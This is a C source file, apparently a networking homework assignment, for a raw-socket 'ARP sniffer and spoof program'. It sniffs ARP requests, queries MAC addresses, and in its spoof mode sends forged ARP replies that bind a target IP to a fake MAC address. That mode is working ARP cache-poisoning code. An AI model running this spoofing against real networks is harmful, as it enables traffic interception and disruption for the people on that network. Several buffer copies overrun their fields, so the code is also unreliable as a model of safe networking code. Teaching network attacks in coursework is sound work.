#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include "arp.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ether.h>



/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
#define DEVICE_NAME "ens33"
#define Packet_size 2000
#define ETH_PALEN 4 	//ip addr length 4
#define ETH_HALEN 6 	//hw addr length 6
#define ARP_HRD_ETHER 0x0001	//ARP hw type 0x0001
#define ARP_OP_REQUEST 0x0001	//ARP request 0x0001
#define ARP_OP_REPLY 0x0002		//ARP reply 0x0002


/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */


int main(int argc , char *argv[])
{
	int sockfd_recv = 0, sockfd_send = 0;
	struct sockaddr_ll sa;
	struct ifreq req;
	struct ifreq req_ip;
	struct ifreq req_mac;
	struct in_addr myip;
	
	struct arp_packet arp_packet_recv;
	struct arp_packet arp_packet_send;
	struct ether_addr Src_haddr;
	struct ether_addr Dst_haddr;
	struct ether_addr Arp_Src_haddr;
	struct ether_addr Arp_Dst_haddr;
	
	unsigned char Source_MAC[ETH_ALEN];
	unsigned char Source_IP[ETH_ALEN];
	unsigned char Source_MAC_Addr[ETH_ALEN];
	int get_packet_length;
	u_int8_t packet_receive[Packet_size]; //unsigned,每格8bit
	char tell_ip[15];
	char has_ip[15];
	char receive_sha[32];
	char receive_spa[15];
	char receive_tpa[15];
	in_addr_t ARP_spa;
	in_addr_t ARP_tpa;
	
	u_int8_t	Not_Know_Mac_Addr[ETH_HALEN]={0x00,0x00,0x00,0x00,0x00,0x00};
	unsigned char 	Target_IP[15];
	socklen_t 	addr_len = sizeof(sa);
	struct in_addr dst_in_addr;
	
	// Open a recv socket in data-link layer.
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open recv socket error");
		exit(1);
	}

	/*
	 * Use recvfrom function to get packet.
	 * recvfrom( ... )
	 */
	 

	if (strcmp(argv[0],"./arp")==0){
		if (strcmp(argv[1],"-help")==0 || strcmp(argv[1],"-h")==0 ){
			printf("%s\n","[ ARP sniffer and spoof program ]");
			printf("%s\n","Format :");
			printf("%s\n","1) ./arp -l -a");
			printf("%s\n","2) ./arp -l <filter_ip_address>");
			printf("%s\n","3) ./arp -q <query_ip_address>");
			printf("%s\n","4) ./arp <fake_mac_address> <target_ip_address>");
			exit(1);
		}
		else if(strcmp(argv[1],"-l")==0){
			printf("%s\n","[ ARP sniffer and spoof program ]");
			printf("%s\n","#### ARP sniffer mode ####");
			 
			
			while(1){
				//check是否收到封包	
				if((get_packet_length = recvfrom(sockfd_recv,(void*) &arp_packet_recv,sizeof(struct arp_packet), 0, NULL, NULL)) < 0){
					perror("recvfrom error");
					exit(1);
				} 	
				//check一個封包
				memcpy(packet_receive,(void*) &arp_packet_recv,sizeof(struct arp_packet));
				if(packet_receive[12]==8 && packet_receive[13]==6){
					strcpy(tell_ip,get_sender_protocol_addr((&arp_packet_recv.arp)));
					strcpy(has_ip,get_target_protocol_addr((&arp_packet_recv.arp)));	
					if (strcmp(argv[2],"-a")==0){
						printf("Get ARP packet - Who has %s ? \t Tell %s \n",has_ip,tell_ip);
					}				
					else if (strlen(argv[2])>=7 && strlen(argv[2])<=15){
						if (strcmp(argv[2],has_ip)==0){
							printf("Get ARP packet - Who has %s ? \t Tell %s \n",has_ip,tell_ip);
						}
					}		
				}		
			}				
		}
		else if(strcmp(argv[1],"-q")==0){
			printf("%s\n","[ ARP sniffer and spoof program ]");
			printf("%s\n","#### ARP sniffer mode ####");
			
			// Open a send socket in data-link layer.
			if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0){
				perror("open send socket error");
				exit(sockfd_send);
			}
			
			//initial name
			memset(&req,0,sizeof(req));	
			strcpy(req.ifr_name,DEVICE_NAME);
			memset(&req_ip,0,sizeof(req_ip));
			strcpy(req_ip.ifr_name,DEVICE_NAME);
			memset(&req_mac,0,sizeof(req_mac));
			strncpy(req_mac.ifr_name,DEVICE_NAME, ETH_ALEN);	
						
			//socket requset偵錯
			if( ioctl(sockfd_send,SIOCGIFINDEX, &req)== -1){
				perror("SIOCGIFINDEX Error!");
				exit(1);
			}
			//紀錄source ip
			if (ioctl(sockfd_send,SIOCGIFADDR, &req_ip)== -1){
				perror("SIOCGIFADDR Error!");
			}
			memcpy(Source_IP , req_ip.ifr_addr.sa_data+2 , ETH_HALEN);
			//紀錄source MAC
			if( ioctl(sockfd_send,SIOCGIFHWADDR, (void*) &req_mac)== -1){
				perror("SIOCGIFHWADDR ERROR");
				exit(1);
			}
			memcpy(Source_MAC , req_mac.ifr_hwaddr.sa_data , ETH_HALEN); 	
			
			memcpy(arp_packet_send.eth_hdr.ether_shost , req_mac.ifr_hwaddr.sa_data , ETH_HALEN); //多的?
			
			//要傳送的ARP封包
			//設定Ethernet header的hw destination addr欄位廣播
			arp_packet_send.eth_hdr.ether_dhost[0] = 0xff;
			arp_packet_send.eth_hdr.ether_dhost[1] = 0xff;
			arp_packet_send.eth_hdr.ether_dhost[2] = 0xff;
			arp_packet_send.eth_hdr.ether_dhost[3] = 0xff;
			arp_packet_send.eth_hdr.ether_dhost[4] = 0xff;
			arp_packet_send.eth_hdr.ether_dhost[5] = 0xff;
			memcpy(Source_MAC_Addr , arp_packet_send.eth_hdr.ether_dhost , ETH_HALEN); 	
			
			//設定Ethernet header的hw source addr欄位
			memcpy(arp_packet_send.eth_hdr.ether_shost , req_mac.ifr_hwaddr.sa_data , ETH_HALEN);

			//設定Ethernet header的frame type欄位
			arp_packet_send.eth_hdr.ether_type = htons(ETHERTYPE_ARP);		//十六進位轉換成-進位

			//設定ARP封包欄位
			set_hard_type(&arp_packet_send.arp, htons(ARP_HRD_ETHER));
			set_prot_type(&arp_packet_send.arp, htons(ETHERTYPE_IP));
			set_hard_size(&arp_packet_send.arp, ETH_HALEN);
			set_prot_size(&arp_packet_send.arp, ETH_PALEN);
			set_op_code(&arp_packet_send.arp, htons(ARP_OP_REQUEST));
						
			//設定ARP封包sender MAC addr欄位		
			memcpy(arp_packet_send.arp.arp_sha,Source_MAC , ETH_HALEN);			
	    	
			//設定ARP封包sender IP addr欄位		
			memcpy(arp_packet_send.arp.arp_spa,Source_IP , ETH_HALEN); //?
	    			
			//設定ARP封包target MAC addr欄位		
			memcpy(arp_packet_send.arp.arp_tha,Not_Know_Mac_Addr ,ETH_HALEN);
					
			//設定ARP封包target IP addr欄位					
			memcpy(Target_IP,argv[2],15);
			inet_pton(AF_INET, Target_IP, &dst_in_addr);
			memcpy(arp_packet_send.arp.arp_tpa , &dst_in_addr , ETH_HALEN);	

			//socket addr參數
			bzero(&sa, sizeof(sa));

			sa.sll_family = AF_PACKET;
			sa.sll_ifindex = if_nametoindex(req.ifr_name);
			sa.sll_protocol = htons(ETH_P_ARP);
			sa.sll_halen = ETHER_ADDR_LEN;
			sa.sll_hatype = htons(ARP_HRD_ETHER);
			sa.sll_pkttype = PACKET_BROADCAST;
	
			sa.sll_addr[0] = 0xff;
			sa.sll_addr[1] = 0xff;
			sa.sll_addr[2] = 0xff;
			sa.sll_addr[3] = 0xff;
			sa.sll_addr[4] = 0xff;
			sa.sll_addr[5] = 0xff;		

			//送封包
			sendto(sockfd_send, (void*)&arp_packet_send, sizeof(arp_packet_send), 0, (struct sockaddr*)&sa, sizeof(sa));
			
			//接收ARP reply
			while(1){
				
				if(recvfrom(sockfd_recv, &arp_packet_recv, sizeof(arp_packet_recv), 0, (struct sockaddr*)&sa, &addr_len) < 0){
					printf("ERROR: recv\n");
				}
				if(ntohs(arp_packet_recv.eth_hdr.ether_type) == ETHERTYPE_ARP && arp_packet_recv.arp.arp_op == htons(ARP_OP_REPLY)&& memcmp(arp_packet_recv.arp.arp_spa, arp_packet_send.arp.arp_tpa,ETH_PALEN) == 0)
				{
					printf("MAC address of %u.%u.%u.%u is %02x:%02x:%02x:%02x:%02x:%02x\n",
					arp_packet_recv.arp.arp_spa[0], 
					arp_packet_recv.arp.arp_spa[1], 
					arp_packet_recv.arp.arp_spa[2], 
					arp_packet_recv.arp.arp_spa[3],

					arp_packet_recv.arp.arp_sha[0], 
					arp_packet_recv.arp.arp_sha[1], 
					arp_packet_recv.arp.arp_sha[2], 
					arp_packet_recv.arp.arp_sha[3], 
					arp_packet_recv.arp.arp_sha[4], 
					arp_packet_recv.arp.arp_sha[5]);
					exit(1);
				}
			}						
		}
		//fake MAC addr
		else if(strcmp(argv[1],"00:11:22:33:44:55") == 0){
			printf("[ ARP sniffer and spoof program ]\n");
			printf("### ARP spoof mode ###\n");
			
			//check socket
			if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0){
				perror("open recv socket error");
				exit(1);
			}
			if(strlen(argv[2])>= 7 && strlen(argv[2]) <= 15){
				while(1){
					//收封包
					if(get_packet_length = recvfrom( sockfd_recv, (void *)&arp_packet_recv, sizeof(struct arp_packet), 0, NULL, NULL)<0){	
						perror("recvfrom");
						exit(1);
					}
					memcpy(packet_receive,(void *)&arp_packet_recv, sizeof(struct arp_packet)); 
					
					//ARP packet
					if (packet_receive[12]==8 && packet_receive[13]==6){
						//記住傳來packet方的重要資訊
						memcpy(receive_sha,get_sender_hardware_addr(&arp_packet_recv.arp),32);
						strcpy(receive_spa,get_sender_protocol_addr(&arp_packet_recv.arp));
						strcpy(receive_tpa,get_target_protocol_addr(&arp_packet_recv.arp));

						//check對方的目的ip和要fake的ip相同,填要回傳fake MAC的封包
						if(strcmp(argv[2],receive_tpa) == 0){
							if((sockfd_send = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0){
								perror("open send socket error");
								exit(1);
							}
							//string轉成network n系列二進位去掉點點,才能填到封包內
							ether_aton_r(receive_sha, &Dst_haddr);
							memcpy(&arp_packet_send.eth_hdr.ether_dhost, &Dst_haddr,ETH_HALEN);//ethernet dst MAC
							
							ether_aton_r(argv[1], &Src_haddr);
							memcpy(&arp_packet_send.eth_hdr.ether_shost, &Src_haddr,ETH_HALEN);//ethernet src MAC
							arp_packet_send.eth_hdr.ether_type = htons(ETHERTYPE_ARP);

							set_hard_type(&arp_packet_send.arp, htons(ARP_HRD_ETHER));
							set_prot_type(&arp_packet_send.arp, htons(ETHERTYPE_IP));
							set_hard_size(&arp_packet_send.arp, ETH_HALEN);
							set_prot_size(&arp_packet_send.arp, ETH_PALEN);
							set_op_code(&arp_packet_send.arp, htons(ARP_OP_REPLY));//change to op_reply

							//填假的sender hw addr
							ether_aton_r(argv[1], &Arp_Src_haddr);
							memcpy(&arp_packet_send.arp.arp_sha, &Arp_Src_haddr,ETH_HALEN);//sender hardware addr (fake)

							ARP_spa = inet_addr(receive_tpa);
							memcpy(&arp_packet_send.arp.arp_spa, &ARP_spa,ETH_PALEN);

							ether_aton_r(receive_sha, &Arp_Dst_haddr);
							memcpy(&arp_packet_send.arp.arp_tha, &Arp_Dst_haddr,ETH_HALEN);

							ARP_tpa = inet_addr(receive_spa);
							memcpy(&arp_packet_send.arp.arp_tpa,&ARP_tpa ,ETH_PALEN);

							//req填成全0
							memset(&req,0,sizeof(req));
							strcpy(req.ifr_name,DEVICE_NAME);

							if((ioctl(sockfd_send,SIOCGIFINDEX,&req)) < 0 ){
								perror("SIOCGIFINDEX\n");
								exit(1);
							}

							//傳之前設定socket
							bzero(&sa,sizeof(sa));
							sa.sll_family = AF_PACKET;
							sa.sll_ifindex = req.ifr_ifindex;
							sa.sll_halen = ETH_HALEN;
							sa.sll_protocol = htons(ETH_P_ARP);
							memcpy(sa.sll_addr,receive_sha,ETH_HALEN);

							//傳
							if((sendto(sockfd_send,&arp_packet_send,sizeof(arp_packet_send),0,(struct sockaddr *)&sa,sizeof(sa))) < 0){
								perror("sendto");
							}
							else{
								printf("Get ARP packet - who has %s ? \t Tell %s \n",receive_tpa,receive_spa);
								printf("send ARP reply : %u.%u.%u.%u is %02x:%02x:%02x:%02x:%02x:%02x\n",
								arp_packet_send.arp.arp_spa[0], 
								arp_packet_send.arp.arp_spa[1], 
								arp_packet_send.arp.arp_spa[2], 
								arp_packet_send.arp.arp_spa[3],

								arp_packet_send.arp.arp_sha[0], 
								arp_packet_send.arp.arp_sha[1], 
								arp_packet_send.arp.arp_sha[2], 
								arp_packet_send.arp.arp_sha[3], 
								arp_packet_send.arp.arp_sha[4], 
								arp_packet_send.arp.arp_sha[5]);
								printf("send sucessful.\n");
							}

							break;

						}
					}
				}

				
			}

		}

		
		
	}	
	/*
	 * Use ioctl function binds the send socket and the Network Interface Card.
`	 * ioctl( ... )
	 */
	
	

	
	// Fill the parameters of the sa.



	
	/*
	 * use sendto function with sa variable to send your packet out
	 * sendto( ... )
	 */
	
	
	


	return 0;
}

